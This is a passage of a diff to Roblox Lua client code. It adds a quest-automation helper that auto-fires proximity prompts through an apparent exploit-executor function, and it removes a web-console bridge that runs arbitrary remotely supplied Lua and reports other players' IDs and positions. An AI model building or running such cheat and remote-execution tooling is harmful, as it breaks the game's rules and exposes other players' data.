+_G.SAE_Wisp_AutoPrompt = _G.SAE_Wisp_AutoPrompt or false
+_G.SAE_Wisp_AllowFuse = _G.SAE_Wisp_AllowFuse or false
+local function timWisp()
+  local ra = {}
+  for _, o in ipairs(Workspace:GetDescendants()) do
+    if o:IsA("Model") or o:IsA("BasePart") then
+      if string.find(string.lower(o.Name), "wisp", 1, true) then
+        local ok, cf = pcall(function()
+          if o:IsA("Model") then return o:GetPivot() else return o.CFrame end
+        end)
+        if ok then ra[#ra + 1] = { Ten = o.Name, ViTri = cf.Position } end
+        if #ra >= 10 then break end
+      end
+    end
+  end
+  return ra
 end
-
-local fn33
-
-fn33 = function(arg)
-	return {
-		name = arg.Name,
-		className = arg.ClassName,
-		path = fn27(arg),
-		parentPath = arg.Parent and fn27(arg.Parent) or nil,
-	}
+local function quetPrompt(banKinh)
+  local root = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
+  if not root then return {} end
+  local ra = {}
+  for _, o in ipairs(Workspace:GetDescendants()) do
+    if o:IsA("ProximityPrompt") then
+      local goc = o.Parent
+      local vt = (goc and goc:IsA("BasePart")) and goc.Position or (root.Position)
+      if (vt - root.Position).Magnitude <= (banKinh or 30) then
+        local nhan = tostring(o.ObjectText or "") .. " " .. tostring(o.ActionText or "")
+        local n = string.lower(nhan .. " " .. o.Name)
+        if string.find(n, "wisp", 1, true) or string.find(n, "claim", 1, true)
+          or string.find(n, "return", 1, true) or string.find(n, "enchant", 1, true) then
+          ra[#ra + 1] = { Prompt = o, Nhan = nhan, Xa = math.floor((vt - root.Position).Magnitude) }
+        end
+      end
+    end
+  end
+  return ra
 end
-
-local fn34
-
-fn34 = function(arg, arg2, arg3)
-	local children = arg:GetChildren()
-	local n16 = 1
-	local n17 = 0
-
-	while n16 <= #children and n17 < arg2 do
-		local v16 = children[n16]
-		n16 += 1
-		n17 += 1
-		if arg3(v16, n17) then
-			return n17, true
-		end
-
-		if #children < arg2 then
-			local children2 = v16:GetChildren()
-
-			for _, v17 in ipairs(children2) do
-				if not (arg2 <= #children) then
-					table.insert(children, v17)
-					continue
-				end
-				break
-			end
-		end
-	end
-
-	return n17, false
+local function docBangQuest()
+  local gui = localPlayer:FindFirstChildOfClass("PlayerGui")
+  if not gui then return {} end
+  local ra = {}
+  for _, o in ipairs(gui:GetDescendants()) do
+    if o:IsA("TextLabel") or o:IsA("TextButton") then
+      local t = string.lower(o.Text or "")
+      if string.find(t, "wisp", 1, true) or string.find(t, "enchanted forest", 1, true)
+        or string.find(t, "eternal", 1, true) or string.find(t, "%d+/%d+") then
+        if #t > 0 and #t < 160 then ra[#ra + 1] = o.Text end
+        if #ra >= 15 then break end
+      end
+    end
+  end
+  return ra
 end
+task.spawn(function()
+  while true do
+    if _G.SAE_Wisp_Help == true then
+      local npc = {}
+      pcall(function() npc = timWisp() end)
+      if #npc == 0 then
+        print("[Wisp] chua thay NPC Wisp. Di Enchanted Forest (tay phai loi vao, gan bang Speed), Speed muc tieu 50B.")
+      else
+        for _, w in ipairs(npc) do
+          print("[Wisp] thay " .. w.Ten .. " tai " .. tostring(w.ViTri))
+        end
+      end
+      local pr = {}
+      pcall(function() pr = quetPrompt(40) end)
+      for _, p in ipairs(pr) do
+        print("[Wisp] prompt gan ban: [" .. p.Nhan .. "] cach " .. p.Xa .. "m")
+        if _G.SAE_Wisp_AutoPrompt == true and typeof(fireproximityprompt) == "function" then
+          pcall(fireproximityprompt, p.Prompt)
+        end
+      end
+      local bang = {}
+      pcall(function() bang = docBangQuest() end)
+      for _, t in ipairs(bang) do
+        print("[Wisp] GUI: " .. t)
+      end
+      print("[Wisp] Checklist: Q1 steal 20 trung Forest | Q2 fuse 1 thu Forest (can _G.SAE_Wisp_AllowFuse=true) | Q3 steal 1 Eternal | nho Claim sau moi quest | Return Wisp -> mo cay.")
+      if _G.SAE_Wisp_AllowFuse == true then
+        print("[Wisp] CANH BAO: fuse TON PET + PHI. Chi bat khi Q2 dang active va da chon dung 3 pet Forest rac.")
+      end
+    end
+    task.wait(10)
+  end
+end)
+print("[SAE-Addons] da chay | ESP=" .. tostring(_G.SAE_EventForest_ESP) .. " AutoQuest=" .. tostring(_G.SAE_AutoQuest) .. " WispHelp=" .. tostring(_G.SAE_Wisp_Help))
 
-do
-	local name = "CodexMCP"
-
-	local tbl27 = {
-		Frame = true,
-		TextLabel = true,
-		TextButton = true,
-		TextBox = true,
-		ImageLabel = true,
-		ImageButton = true,
-		ScrollingFrame = true,
-		UICorner = true,
-		UIStroke = true,
-		UIListLayout = true,
-		UIGridLayout = true,
-		UIPadding = true,
-		UIAspectRatioConstraint = true,
-		UISizeConstraint = true,
-	}
-
-	local tbl28 = {
-		Active = true,
-		AnchorPoint = true,
-		AutomaticCanvasSize = true,
-		AutomaticSize = true,
-		BackgroundColor3 = true,
-		BackgroundTransparency = true,
-		BorderSizePixel = true,
-		CanvasPosition = true,
-		CanvasSize = true,
-		ClipsDescendants = true,
-		CornerRadius = true,
-		DisplayOrder = true,
-		Enabled = true,
-		FillDirection = true,
-		Font = true,
-		HorizontalAlignment = true,
-		Image = true,
-		ImageColor3 = true,
-		ImageTransparency = true,
-		LayoutOrder = true,
-		LineJoinMode = true,
-		MaxTextSize = true,
-		MinTextSize = true,
-		Name = true,
-		Padding = true,
-		PaddingBottom = true,
-		PaddingLeft = true,
-		PaddingRight = true,
-		PaddingTop = true,
-		Position = true,
-		RichText = true,
-		Rotation = true,
-		ScrollBarThickness = true,
-		Size = true,
-		SortOrder = true,
-		Text = true,
-		TextColor3 = true,
-		TextScaled = true,
-		TextSize = true,
-		TextStrokeColor3 = true,
-		TextStrokeTransparency = true,
-		TextTransparency = true,
-		TextTruncate = true,
-		TextWrapped = true,
-		TextXAlignment = true,
-		TextYAlignment = true,
-		Thickness = true,
-		Transparency = true,
-		VerticalAlignment = true,
-		Visible = true,
-		ZIndex = true,
-	}
-
-	local tbl29 = {
-		BackgroundColor3 = true,
-		BorderColor3 = true,
-		Color = true,
-		ImageColor3 = true,
-		TextColor3 = true,
-		TextStrokeColor3 = true,
-	}
-
-	local tbl30 = { CanvasPosition = false, CanvasSize = true, Position = true, Size = true }
-	local tbl31 = { AnchorPoint = true, CanvasPosition = true }
-
-	local tbl32 = {
-		CornerRadius = true,
-		Padding = true,
-		PaddingBottom = true,
-		PaddingLeft = true,
-		PaddingRight = true,
-		PaddingTop = true,
-	}
-
-	local tbl33 = {
-		AutomaticCanvasSize = Enum.AutomaticSize,
-		AutomaticSize = Enum.AutomaticSize,
-		FillDirection = Enum.FillDirection,
-		Font = Enum.Font,
-		HorizontalAlignment = Enum.HorizontalAlignment,
-		LineJoinMode = Enum.LineJoinMode,
-		SortOrder = Enum.SortOrder,
-		TextTruncate = Enum.TextTruncate,
-		TextXAlignment = Enum.TextXAlignment,
-		TextYAlignment = Enum.TextYAlignment,
-		VerticalAlignment = Enum.VerticalAlignment,
-	}
-
-	local function fn35(arg)
-		if type(arg) ~= "table" then
-			return nil
-		end
-		local num = tonumber(arg[1] or arg.r)
-		local num2 = tonumber(arg[2] or arg.g)
-		local num3 = tonumber(arg[3] or arg.b)
-		if not num or not num2 or not num3 then
-			return nil
-		end
-
-		if num <= 1 and num2 <= 1 and num3 <= 1 then
-			return Color3.new(num, num2, num3)
-		end
-		local floor = math.floor
-		return Color3.fromRGB(math.floor(fn22(num, 0, 255, 0)), math.floor(fn22(num2, 0, 255, 0)), floor(fn22(num3, 0, 255, 0)))
-	end
-
-	local function fn36(arg)
-		if type(arg) ~= "table" then
-			return nil
-		end
-		return UDim2.new(tonumber(arg[1] or arg.xScale) or 0, tonumber(arg[2] or arg.xOffset) or 0, tonumber(arg[3] or arg.yScale) or 0, tonumber(arg[4] or arg.yOffset) or 0)
-	end
-
-	local function fn37(arg)
-		if type(arg) ~= "table" then
-			return nil
-		end
-		return Vector2.new(tonumber(arg[1] or arg.x) or 0, tonumber(arg[2] or arg.y) or 0)
-	end
-
-	local function fn38(arg)
-		if type(arg) == "number" then
-			return UDim.new(0, arg)
-		end
-
-		if type(arg) ~= "table" then
-			return nil
-		end
-		return UDim.new(tonumber(arg[1] or arg.scale) or 0, tonumber(arg[2] or arg.offset) or 0)
-	end
-
-	local function fn39(arg, arg2)
-		if tbl29[arg] then
-			return fn35(arg2)
-		end
-
-		if tbl30[arg] then
-			return fn36(arg2)
-		end
-
-		if tbl31[arg] then
-			return fn37(arg2)
-		end
-
-		if tbl32[arg] then
-			return fn38(arg2)
-		end
-
-		if tbl33[arg] then
-			if typeof(arg2) == "EnumItem" then
-				return arg2
-			end
-			return tbl33[arg][tostring(arg2):match("([^%.]+)$")]
-		end
-
-		return arg2
-	end
-
-	local function fn40(arg, arg2)
-		if type(arg2) ~= "table" then
-			return { applied = 0, rejected = {} }
-		end
-		local tbl34 = {}
-		local n16 = 0
-
-		for k, v16 in pairs(arg2) do
-			if not tbl28[k] then
-				table.insert(tbl34, { property = tostring(k), reason = "not_allowed" })
-			else
-				local v17 = fn39(k, v16)
-
-				if v17 == nil then
-					table.insert(tbl34, { property = k, reason = "invalid_value" })
-				else
-					local ok, result = pcall(function()
-						arg[k] = v17
-					end)
-
-					if ok then
-						n16 += 1
-					else
-						table.insert(tbl34, { property = k, reason = tostring(result) })
-					end
-				end
-			end
-		end
-
-		return { applied = n16, rejected = tbl34 }
-	end
-
-	local function fn41()
-		return localPlayer2:FindFirstChildOfClass("PlayerGui") or localPlayer2:WaitForChild("PlayerGui", 10)
-	end
-
-	local function fn42(arg)
-		local v16 = fn41()
-		if not v16 then
-			return nil, "PlayerGui is unavailable"
-		end
-		local codexMCP = v16:FindFirstChild("CodexMCP")
-
-		if not codexMCP and arg then
-			codexMCP = Instance.new("ScreenGui")
-			codexMCP.Name = name
-			codexMCP.ResetOnSpawn = false
-			codexMCP.IgnoreGuiInset = false
-			codexMCP.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-			codexMCP.Parent = v16
-		end
-
-		return codexMCP
-	end
-
-	local function fn43(arg)
-		local v16, v17 = fn42(false)
-		if not v16 then
-			return nil, v17 or "managed UI does not exist"
-		end
-		local v18 = fn21(arg)
-		if v18 == "" or v18 == name then
-			return v16
-		end
-
-		for match in v18:gmatch("[^%.]+") do
-			if match == name then
-				continue
-			end
-			v16 = v16:FindFirstChild(match)
-			if not v16 then
-				return nil, "managed UI path not found: " .. match
-			end
-		end
-
-		return v16
-	end
-
-	local tbl34 = { Activated = true, MouseButton1Click = true, FocusLost = true }
-
-	local function fn44(arg, arg2)
-		if type(arg2) ~= "table" then
-			return
-		end
-
-		for _, v16 in ipairs(arg2) do
-			if tbl34[v16] then
-				local ok, result = pcall(function()
-					return arg[v16]
-				end)
-
-				if ok and result and type(result.Connect) == "function" then
-					local connection = result:Connect(function(...)
-						local tbl35 = { ... }
-						fn30("ui." .. v16, { path = fn27(arg), name = arg.Name, className = arg.ClassName, arguments = fn28(tbl35) })
-					end)
-
-					table.insert(tbl24, connection)
-				end
-			end
-		end
-	end
-
-	local fn45 = nil
-
-	fn45 = function(arg, parent, arg2, arg3)
-		if arg2 > 10 then
-			error("UI tree exceeds maximum depth of 10")
-		end
-
-		if arg3.count >= 250 then
-			error("UI tree exceeds maximum of 250 objects")
-		end
-
-		if type(arg) ~= "table" then
-			error("UI node must be an object")
-		end
-
-		local uiClassIsNotAllowed = fn21(arg.class or arg.className)
-
-		if not tbl27[uiClassIsNotAllowed] then
-			error("UI class is not allowed: " .. uiClassIsNotAllowed)
-		end
-
-		arg3.count = arg3.count + 1
-		local instance = Instance.new(uiClassIsNotAllowed)
-		instance.Name = fn21(arg.name) ~= "" and fn21(arg.name):sub(1, 64) or uiClassIsNotAllowed .. arg3.count
-		local v16 = fn40(instance, arg.props)
-		instance.Parent = parent
-		fn44(instance, arg.events)
-		local children = type(arg.children) == "table" and arg.children or {}
-
-		for _, child in ipairs(children) do
-			fn45(child, instance, arg2 + 1, arg3)
-		end
-
-		return instance, v16
-	end
-
-	local fn46 = nil
-
-	fn46 = function(arg, arg2, arg3)
-		local v16 = fn33(arg)
-		if arg2 >= arg3 then
-			v16.truncated = #arg:GetChildren() > 0
-			return v16
-		end
-		v16.children = {}
-
-		for _, child in ipairs(arg:GetChildren()) do
-			table.insert(v16.children, fn46(child, arg2 + 1, arg3))
-		end
-
-		return v16
-	end
-
-	local n16 = 60000
-	local n17 = 80
-	local tbl35 = {}
-
-	local function fn47(...)
-		local v16 = table.pack(...)
-		local tbl36 = {}
-
-		for i = 1, select("#", ...) do
-			local v17 = tostring
-			local value = select(i, table.unpack(v16, 1, v16.n))
-			tbl36[i] = v17(value)
-		end
-
-		return table.concat(tbl36, " ")
-	end
-
-	local function fn48(arg, arg2)
-		local str5 = tostring(arg or "")
-
-		if str5:match("^%s*$") then
-			error("Code is empty", 0)
-		end
-
-		local str6 = "=" .. tostring(arg2 or "WebConsole"):sub(1, 60)
-		local chunk, v16 = loadstring(str5, str6)
-
-		if not chunk then
-			local chunk2 = loadstring("return " .. str5, str6)
-			if chunk2 then
-				return chunk2
-			end
-			error("Syntax error: " .. tostring(v16), 0)
-		end
-
-		return chunk
-	end
-
-	local function fn49(arg)
-		local env = getfenv(0)
-
-		local obj = setmetatable({}, {
-			__index = env,
-			__newindex = function(arg2, arg3, arg4)
-				env[arg3] = arg4
-			end,
-		})
-
-		rawset(obj, "print", function(...)
-			local v16 = table.pack(...)
-			arg("print", fn47(...))
-
-			if flag4 then
-				print(table.unpack(v16, 1, v16.n))
-			end
-		end)
-
-		rawset(obj, "warn", function(...)
-			local v16 = table.pack(...)
-			arg("warn", fn47(...))
-
-			if flag4 then
-				warn(table.unpack(v16, 1, v16.n))
-			end
-		end)
-
-		return obj
-	end
-
-	local function fn50(arg)
-		local kind = typeof(arg)
-		local ok, result = pcall(tostring, arg)
-
-		return {
-			type = kind,
-			text = (ok and tostring(result) or "<unprintable>"):sub(1, 4000),
-			value = kind ~= "nil" and fn28(arg) or nil,
-		}
-	end
-
-	local function fn51(arg, arg2, arg3, arg4)
-		local tbl36 = {}
-		local tbl37 = {}
-
-		for i = 2, arg.n do
-			tbl36[i - 1] = fn28(arg[i])
-			tbl37[i - 1] = fn50(arg[i])
-		end
-
-		return {
-			output = table.concat(arg3, "\n"),
-			outputTruncated = arg4 or nil,
-			returns = tbl36,
-			returnsInfo = tbl37,
-			returnCount = arg.n - 1,
-			elapsedMs = arg2,
-		}
-	end
-
-	local function fn52(arg)
-		return debug.traceback(tostring(arg), 2)
-	end
-
-	local function fn53(arg)
-		if #arg.pending == 0 then
-			return
-		end
-		local pending = arg.pending
-		arg.pending = {}
-		fn30("exec.output", { runId = arg.id, label = arg.label, lines = pending })
-	end
-
-	local function fn54(arg, arg2)
-		local character = arg.Character
-		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
-		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
-
-		return {
-			name = arg.Name,
-			displayName = arg.DisplayName,
-			userId = arg.UserId,
-			accountAge = arg.AccountAge,
-			team = arg.Team and arg.Team.Name or nil,
-			neutral = arg.Neutral,
-			character = character and character.Name or nil,
-			health = humanoid and humanoid.Health or nil,
-			maxHealth = humanoid and humanoid.MaxHealth or nil,
-			position = arg2 and humanoidRootPart and fn28(humanoidRootPart.Position) or nil,
-		}
-	end
-
-	local tbl36 = {
-		["system.ping"] = function(arg)
-			return { pong = true, echo = arg, clientTime = DateTime.now().UnixTimestampMillis }
-		end,
-		["game.info"] = function()
-			return {
-				placeId = game.PlaceId,
-				gameId = game.GameId,
-				jobId = game.JobId,
-				placeVersion = game.PlaceVersion,
-				privateServerId = game.PrivateServerId,
-				privateServerOwnerId = game.PrivateServerOwnerId,
-				playerCount = #Players2:GetPlayers(),
-				localPlayer = { name = localPlayer2.Name, displayName = localPlayer2.DisplayName, userId = localPlayer2.UserId },
-			}
-		end,
-		execute_lua = function(arg)
-			local v16 = fn48(arg.code, arg.label)
-			local tbl36 = {}
-			local n18 = 0
-			local flag9 = false
-
-			local v17 = fn49(function(arg2, arg3)
-				if flag9 then
-					return
-				end
-				local str5 = (arg2 == "warn" and "[warn] " or "") .. arg3
-				n18 = n18 + #str5 + 1
-
-				if n16 < n18 then
-					flag9 = true
-					table.insert(tbl36, "... output truncated ...")
-					return
-				end
-
-				table.insert(tbl36, str5)
-			end)
-
-			setfenv(v16, v17)
-			local now = os.clock()
-			local v18 = table.pack(xpcall(v16, fn52))
-			local n19 = math.floor((os.clock() - now) * 1000 + 0.5)
-
-			if not v18[1] then
-				error(string.format("Runtime error: %s\n--- output ---\n%s", tostring(v18[2]), table.concat(tbl36, "\n"):sub(-20000)), 0)
-			end
-
-			return fn51(v18, n19, tbl36, flag9)
-		end,
-		["exec.async"] = function(arg)
-			local v16 = fn48(arg.code, arg.label)
-			local tbl36 = { id = HttpService2:GenerateGUID(false):sub(1, 8) }
-			tbl36.label = tostring(arg.label or "Script"):sub(1, 60)
-			tbl36.startedAt = os.clock()
-			tbl36.pending = {}
-			tbl36.lineCount = 0
-			tbl36.dropped = 0
-
-			local v17 = fn49(function(arg2, arg3)
-				tbl36.lineCount = tbl36.lineCount + 1
-				if #tbl36.pending >= n17 then
-					tbl36.dropped = tbl36.dropped + 1
-					return
-				end
-				table.insert(tbl36.pending, { kind = arg2, text = arg3:sub(1, 1000) })
-			end)
-
-			setfenv(v16, v17)
-			tbl35[tbl36.id] = tbl36
-
-			task.spawn(function()
-				while tbl35[tbl36.id] == tbl36 do
-					task.wait(0.3)
-
-					if tbl36.dropped > 0 then
-						table.insert(tbl36.pending, { kind = "warn", text = string.format("... %d line(s) skipped ...", tbl36.dropped) })
-						tbl36.dropped = 0
-					end
-
-					fn53(tbl36)
-				end
-			end)
-
-			tbl36.thread = task.defer(function()
-				local v18 = table.pack(xpcall(v16, fn52))
-				if tbl35[tbl36.id] ~= tbl36 then
-					return
-				end
-				tbl35[tbl36.id] = nil
-				fn53(tbl36)
-				local startedAt = tbl36.startedAt
-				local n18 = math.floor((os.clock() - startedAt) * 1000 + 0.5)
-				local tbl37 = { runId = tbl36.id, label = tbl36.label, ok = v18[1] == true, elapsedMs = n18 }
-
-				if v18[1] then
-					local v19 = fn51(v18, n18, {}, false)
-					tbl37.returnsInfo = v19.returnsInfo
-					tbl37.returnCount = v19.returnCount
-				else
-					tbl37.error = tostring(v18[2]):sub(1, 4000)
-				end
-
-				fn30("exec.finished", tbl37)
-			end)
-
-			return { runId = tbl36.id, label = tbl36.label }
-		end,
-		["exec.cancel"] = function(arg)
-			local v16 = tbl35[tostring(arg.runId or "")]
-			if not v16 then
-				return { cancelled = false, reason = "not running" }
-			end
-			tbl35[v16.id] = nil
-			pcall(task.cancel, v16.thread)
-			fn53(v16)
-			local startedAt = v16.startedAt
-
-			fn30("exec.finished", {
-				runId = v16.id,
-				label = v16.label,
-				ok = false,
-				cancelled = true,
-				error = "Cancelled from the web console",
-				elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5),
-			})
-
-			return { cancelled = true, runId = v16.id }
-		end,
-		["exec.list"] = function()
-			local tbl36 = {}
-
-			for k, v16 in pairs(tbl35) do
-				local startedAt = v16.startedAt
-
-				table.insert(tbl36, {
-					runId = k,
-					label = v16.label,
-					lines = v16.lineCount,
-					elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5),
-				})
-			end
-
-			return { count = #tbl36, runs = tbl36 }
-		end,
-		["console.tail"] = function(arg)
-			local logHistory = game:GetService("LogService"):GetLogHistory()
-			local v16 = fn22(arg.limit, 1, 500, 200)
-			local n18 = tonumber(arg.since) or 0
-			local tbl36 = {}
-
-			for i = #logHistory, 1, -1 do
-				local v17 = logHistory[i]
-
-				if not (v17.timestamp <= n18 or #tbl36 >= v16) then
-					table.insert(tbl36, 1, {
-						message = tostring(v17.message):sub(1, 1000),
-						kind = v17.messageType.Name,
-						time = v17.timestamp,
-					})
-
-					continue
-				end
-
-				break
-			end
-
-			return { count = #tbl36, entries = tbl36, latest = logHistory[#logHistory] and logHistory[#logHistory].timestamp or n18 }
-		end,
-		["players.list"] = function(arg)
-			local tbl36 = {}
-			local flag9 = arg.includePosition ~= false
-
-			for _, player in ipairs(Players2:GetPlayers()) do
-				table.insert(tbl36, fn54(player, flag9))
-			end
-
-			table.sort(tbl36, function(arg2, arg3)
-				return string.lower(arg2.name) < string.lower(arg3.name)
-			end)
-
-			return { count = #tbl36, players = tbl36 }
-		end,
-		["players.get"] = function(arg)
-			local query = arg.query
-			local num = tonumber(query)
-			local v16 = string.lower(fn21(query))
-
-			for _, player in ipairs(Players2:GetPlayers()) do
-				if num and player.UserId == num or string.lower(player.Name) == v16 or string.lower(player.DisplayName) == v16 then
-					return fn54(player, true)
-				end
-			end
-
-			error("player not found: " .. tostring(query))
-		end,
-		["characters.list"] = function()
-			local tbl36 = {}
-
-			for _, player in ipairs(Players2:GetPlayers()) do
-				local character = player.Character
-				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
-				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
-
-				table.insert(tbl36, {
-					player = player.Name,
-					userId = player.UserId,
-					characterPath = character and fn27(character) or nil,
-					health = humanoid and humanoid.Health or nil,
-					maxHealth = humanoid and humanoid.MaxHealth or nil,
-					walkSpeed = humanoid and humanoid.WalkSpeed or nil,
-					jumpPower = humanoid and humanoid.JumpPower or nil,
-					moveDirection = humanoid and fn28(humanoid.MoveDirection) or nil,
-					state = humanoid and tostring(humanoid:GetState()) or nil,
-					position = humanoidRootPart and fn28(humanoidRootPart.Position) or nil,
-					velocity = humanoidRootPart and fn28(humanoidRootPart.AssemblyLinearVelocity) or nil,
-				})
-			end
-
-			return { count = #tbl36, characters = tbl36 }
-		end,
-		["workspace.summary"] = function(arg)
-			local n18 = math.floor(fn22(arg.maxDescendants, 1, 5000, 2000))
-			local tbl36 = {}
-			local tbl37 = {}
-
-			for _, child in ipairs(Workspace:GetChildren()) do
-				table.insert(tbl37, fn33(child))
-			end
-
-			local v16 = fn34(Workspace, n18, function(arg2)
-				tbl36[arg2.ClassName] = (tbl36[arg2.ClassName] or 0) + 1
-				return false
-			end)
-
-			return {
-				topLevel = tbl37,
-				topLevelCount = #tbl37,
-				scannedDescendants = v16,
-				truncated = v16 >= n18,
-				classCounts = tbl36,
-			}
-		end,
-		["instance.find"] = function(arg)
-			local v16, v17 = fn31(arg.root or "Workspace")
-
-			if not v16 then
-				error(v17)
-			end
-
-			local v18 = string.lower(fn21(arg.nameContains))
-			local v19 = fn21(arg.className)
-			local n18 = math.floor(fn22(arg.limit, 1, 200, 50))
-			local tbl36 = {}
-
-			local v20 = fn34(v16, math.floor(fn22(arg.scanLimit, 1, 10000, 3000)), function(arg2)
-				local flag9 = v18 == "" or string.find(string.lower(arg2.Name), v18, 1, true) ~= nil
-				local flag10 = false
-
-				if v19 ~= "" and arg2.ClassName ~= v19 then
-					pcall(function()
-						flag10 = arg2:IsA(v19)
-					end)
-				end
-
-				if flag9 and (v19 == "" or arg2.ClassName == v19 or flag10) then
-					table.insert(tbl36, fn33(arg2))
-				end
-
-				return #tbl36 >= n18
-			end)
-
-			return { root = fn27(v16), scanned = v20, count = #tbl36, matches = tbl36 }
-		end,
-		["instance.children"] = function(arg)
-			local v16, v17 = fn31(arg.path)
-
-			if not v16 then
-				error(v17)
-			end
-
-			local n18 = math.floor(fn22(arg.limit, 1, 500, 100))
-			local children = v16:GetChildren()
-			local tbl36 = {}
-
-			for i = 1, math.min(#children, n18) do
-				table.insert(tbl36, fn33(children[i]))
-			end
-
-			return { parent = fn33(v16), total = #children, returned = #tbl36, children = tbl36 }
-		end,
-		["instance.inspect"] = function(arg)
-			local v16, v17 = fn31(arg.path)
-
-			if not v16 then
-				error(v17)
-			end
-
-			local tbl36 = {}
-
-			for _, v18 in ipairs(tbl25) do
-				tbl36[v18] = true
-			end
-
-			if type(arg.properties) == "table" then
-				for _, property in ipairs(arg.properties) do
-					tbl36[tostring(property)] = true
-				end
-			end
-
-			local tbl37 = {}
-			local tbl38 = {}
-
-			for k in pairs(tbl36) do
-				local v18, v19 = fn32(v16, k)
-
-				if v19 then
-					tbl38[k] = v19
-				else
-					tbl37[k] = v18
-				end
-			end
-
-			return {
-				instance = fn33(v16),
-				attributes = fn28(v16:GetAttributes()),
-				tags = fn28(v16:GetTags()),
-				childCount = #v16:GetChildren(),
-				properties = tbl37,
-				unavailable = tbl38,
-			}
-		end,
-		["instance.attributes"] = function(arg)
-			local v16, v17 = fn31(arg.path)
-
-			if not v16 then
-				error(v17)
-			end
-
-			return { instance = fn33(v16), attributes = fn28(v16:GetAttributes()) }
-		end,
-		["camera.get"] = function()
-			local currentCamera = Workspace.CurrentCamera
-
-			if not currentCamera then
-				error("CurrentCamera is unavailable")
-			end
-
-			return {
-				path = fn27(currentCamera),
-				cameraType = tostring(currentCamera.CameraType),
-				fieldOfView = currentCamera.FieldOfView,
-				viewportSize = fn28(currentCamera.ViewportSize),
-				cframe = fn28(currentCamera.CFrame),
-				focus = fn28(currentCamera.Focus),
-				subject = fn28(currentCamera.CameraSubject),
-			}
-		end,
-		["telemetry.snapshot"] = function()
-			local result = RunService2.RenderStepped:Wait()
-			local totalMemoryUsageMb = nil
-
-			pcall(function()
-				totalMemoryUsageMb = game:GetService("Stats"):GetTotalMemoryUsageMb()
-			end)
-
-			return {
-				fpsEstimate = result > 0 and math.floor(1 / result + 0.5) or nil,
-				frameDeltaMs = result * 1000,
-				memoryMb = totalMemoryUsageMb,
-				playerCount = #Players2:GetPlayers(),
-				placeId = game.PlaceId,
-				jobId = game.JobId,
-				distributedGameTime = Workspace.DistributedGameTime,
-				timestamp = DateTime.now().UnixTimestampMillis,
-			}
-		end,
-		["ui.create"] = function(arg)
-			local v16, v17 = fn42(true)
-
-			if not v16 then
-				error(v17)
-			end
-
-			if arg.replace ~= false then
-				fn23(tbl24)
-
-				for _, child in ipairs(v16:GetChildren()) do
-					child:Destroy()
-				end
-			end
-
-			local tbl36 = { count = 0 }
-			local v18, v19 = fn45(arg.tree, v16, 1, tbl36)
-			return { created = fn33(v18), objectCount = tbl36.count, propertyResult = v19 }
-		end,
-		["ui.update"] = function(arg)
-			local v16, v17 = fn43(arg.path)
-
-			if not v16 then
-				error(v17)
-			end
-
-			return { instance = fn33(v16), result = fn40(v16, arg.props) }
-		end,
-		["ui.delete"] = function(arg)
-			local v16 = fn21(arg.path)
-			local v17, v18 = fn43(v16)
-
-			if not v17 then
-				if v16 == "" then
-					return { deleted = false, reason = "managed UI does not exist" }
-				end
-				error(v18)
-			end
-
-			fn23(tbl24)
-			local v19 = fn27(v17)
-			v17:Destroy()
-			return { deleted = true, path = v19 }
-		end,
-		["ui.list"] = function(arg)
-			local v16, v17 = fn42(false)
-			if not v16 then
-				return { exists = false, reason = v17 or "managed UI does not exist" }
-			end
-			local n18 = math.floor(fn22(arg.maxDepth, 1, 10, 6))
-			return { exists = true, tree = fn46(v16, 0, n18) }
-		end,
-		["ui.notify"] = function(arg)
-			local v16, v17 = fn42(true)
-
-			if not v16 then
-				error(v17)
-			end
-
-			local notifications = v16:FindFirstChild("Notifications")
-
-			if not notifications then
-				notifications = Instance.new("Frame")
-				notifications.Name = "Notifications"
-				notifications.AnchorPoint = Vector2.new(1, 0)
-				notifications.Position = UDim2.new(1, -16, 0, 16)
-				notifications.Size = UDim2.fromOffset(360, 500)
-				notifications.BackgroundTransparency = 1
-				notifications.Parent = v16
-				local uiListLayout = Instance.new("UIListLayout")
-				uiListLayout.Padding = UDim.new(0, 8)
-				uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
-				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-				uiListLayout.Parent = notifications
-			end
-
-			local textLabel = Instance.new("TextLabel")
-			textLabel.Name = "Notification_" .. HttpService2:GenerateGUID(false)
-			textLabel.Size = UDim2.fromOffset(340, 64)
-			textLabel.BackgroundColor3 = fn35(arg.color) or Color3.fromRGB(25, 35, 52)
-			textLabel.BackgroundTransparency = 0.08
-			textLabel.Text = tostring(arg.text):sub(1, 500)
-			textLabel.TextColor3 = Color3.fromRGB(240, 247, 255)
-			textLabel.TextSize = 16
-			textLabel.Font = Enum.Font.GothamSemibold
-			textLabel.TextWrapped = true
-			textLabel.Parent = notifications
-			local uiCorner = Instance.new("UICorner")
-			uiCorner.CornerRadius = UDim.new(0, 10)
-			uiCorner.Parent = textLabel
-			local v18 = fn22(arg.duration, 0.5, 30, 4)
-
-			task.delay(v18, function()
-				if textLabel.Parent then
-					textLabel:Destroy()
-				end
-			end)
-
-			return { shown = true, name = textLabel.Name, duration = v18 }
-		end,
-	}
-
-	local function fn55(arg)
-		local str5 = tostring(arg.requestId or "")
-		local unknownOrDisallowedMethod = tostring(arg.method or "")
-		local v16 = tbl36[unknownOrDisallowedMethod]
-		if str5 == "" then
-			return
-		end
-
-		if not v16 then
-			fn29({
-				type = "rpc_result",
-				requestId = str5,
-				success = false,
-				error = "Unknown or disallowed method: " .. unknownOrDisallowedMethod,
-			})
-
-			return
-		end
-
-		task.spawn(function()
-			local ok, result = xpcall(function()
-				return v16(type(arg.params) == "table" and arg.params or {})
-			end, function(arg2)
-				return debug.traceback(tostring(arg2), 2)
-			end)
-
-			if ok then
-				fn29({ type = "rpc_result", requestId = str5, success = true, data = fn28(result) })
-			else
-				fn29({ type = "rpc_result", requestId = str5, success = false, error = tostring(result):sub(1, 2000) })
-			end
-		end)
-	end
-
-	local function fn56(arg)
-		local ok, result = pcall(function()
-			return HttpService2:JSONDecode(tostring(arg))
-		end)
-
-		if not ok or type(result) ~= "table" then
-			fn20("Invalid JSON message")
-			return
-		end
-
-		if result.type == "identify_ok" then
